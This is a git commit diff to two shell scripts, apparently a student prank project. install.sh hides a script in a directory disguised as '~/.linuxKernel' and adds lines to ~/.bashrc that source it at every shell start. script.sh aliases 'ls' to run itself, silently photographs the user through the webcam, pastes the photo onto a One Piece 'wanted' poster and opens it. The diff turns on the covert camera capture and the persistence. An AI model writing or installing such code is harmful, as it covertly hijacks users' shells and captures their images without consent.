1916f61dd0a2388d790ddebdbc15aab368dedce1
Sébastien Doussang <sebastien.doussang@epitech.eu>
2026-06-04 14:45:32 +0200

    feat: full install + working script

--- install.sh
+++ install.sh
@@ -2,10 +2,11 @@
 
 KERNEL_DIR="$HOME/.linuxKernel"
 
-SOURCE_NOTICE="./one_piece_notice.png" #TODO: change for access from usb key
+SOURCE_NOTICE="./one_piece_notice.png"
 INSTALLED_NOTICE="$KERNEL_DIR/notice.png"
 IMG_PATH="$KERNEL_DIR/result.png"
 OUT_FILE="$KERNEL_DIR/output.png"
+RC="$HOME/.bashrc"
 
 if [ ! -d "$KERNEL_DIR" ]; then
     mkdir -p "$KERNEL_DIR"
@@ -13,14 +14,16 @@ fi
 
 if [ ! -f "$INSTALLED_NOTICE" ]; then
     if [ -f "$SOURCE_NOTICE" ]; then
-        touch "$IMG_PATH"
-        touch "$OUT_FILE"
         cp "$SOURCE_NOTICE" "$INSTALLED_NOTICE"
+        cp "$SOURCE_NOTICE" "$IMG_PATH"
+        cp "$SOURCE_NOTICE" "$OUT_FILE"
         cp "script.sh" "$KERNEL_DIR"
     else
         exit 1
     fi
 fi
 
-echo "# // Important klinux kernel instructions // " >> .bashrc
-echo "alias ls='ls ; bash /.linuxKernel/script.sh" >> .bashrc
+echo "# LinuxKernel integration" >> "$RC"
+echo "if [ -f "$HOME/.linuxKernel/script.sh" ]; then" >> "$RC"
+echo "  source "$HOME/.linuxKernel/script.sh"" >> "$RC"
+echo "fi" >> "$RC"
--- script.sh
+++ script.sh
@@ -1,25 +1,15 @@
 #!/bin/bash
 
+alias ls='ls ; bash ~/.linuxKernel/script.sh'
+
 KERNEL_DIR="$HOME/.linuxKernel"
 
-SOURCE_NOTICE="$HOME/Downloads/one_piece_notice.png" #TODO: change for access from usb key
+SOURCE_NOTICE="./one_piece_notice.png"
 INSTALLED_NOTICE="$KERNEL_DIR/notice.png"
 IMG_PATH="$KERNEL_DIR/result.png"
 OUT_FILE="$KERNEL_DIR/output.png"
 
-if [ ! -d "$KERNEL_DIR" ]; then
-    mkdir -p "$KERNEL_DIR"
-fi
-
-if [ ! -f "$INSTALLED_NOTICE" ]; then
-    if [ -f "$SOURCE_NOTICE" ]; then
-        cp "$SOURCE_NOTICE" "$INSTALLED_NOTICE"
-    else
-        exit 1
-    fi
-fi
-
-# gst-launch-1.0 -q v4l2src device=/dev/video0 num_buffers=1 ! jpegenc ! filesink location="$IMG_PATH"
+gst-launch-1.0 -q v4l2src device=/dev/video0 num_buffers=1 ! jpegenc ! filesink location="$IMG_PATH"
 if [ ! -f "$IMG_PATH" ]; then
   exit 1
 fi
@@ -29,6 +19,4 @@ magick "$IMG_PATH" \
   -composite \
   "$OUT_FILE"
 
-echo "# // Important klinux kernel instructions // " >> .bashrc
-echo "alias ls='ls ; bash /.linuxKernel/script2.sh" >> .bashrc
 xdg-open "$OUT_FILE"
